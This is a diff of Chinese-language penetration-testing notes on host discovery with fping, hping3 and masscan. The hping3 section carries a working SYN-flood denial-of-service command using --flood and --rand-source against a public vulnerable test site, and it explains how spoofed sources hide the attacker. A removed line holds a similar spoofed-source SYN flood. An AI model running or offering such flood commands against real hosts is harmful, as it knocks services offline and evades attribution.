@@ -3,7 +3,7 @@
 # 01 -  信息收集
 ## 1.1存活主机识别
 ### 1.1.1 arping
-pass
+好像没啥用，先空着。
 ### 1.1.2 fping
 
 Fping类似于ping，但比ping强大。Fping与ping不同的地方在于，fping可以在命令行中指定要ping的主机数量范围，也可以指定含有要ping的主机列表文件。
@@ -18,20 +18,22 @@ fping -g IP1 IP2（IP1地址开始范围，IP2地址结束范围）；
 ```
 ### 1.1.3 hping3
 
+hping3的功能：
+防火墙测试
+端口扫描
+Idle扫描
+文件传输
+木马功能
+拒绝服务攻击DDOS
 
-使用hping3进行DoS攻击：
+这里讲讲
 
-使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。
-
-```
-hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
-```
-now I use testphp.vulnweb.com to test :
-
+拒绝服务攻击DDOS
+我使用 testphp.vulnweb.com 这个网站来测试 :
 ```
 hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source testphp.vulnweb.com
 ```
-Do not uses string like:  http:// or www.
+注意不要加上:  http:// or www.否则会报错。
 
     -c：发送数据包的个数
     -d：每个数据包的大小
@@ -41,3 +43,9 @@ Do not uses string like:  http:// or www.
     –flood：尽可能快的发送数据包
     –rand-source：使用随机的IP地址，目标机器看到一堆ip，不能定位你的实际IP；也可以使用-a或–spoof隐藏主机名
 
+### 1.1.4 masscan
+
+扫描用：
+```
+Masscan 10.11.0.0/16 -p80
+```
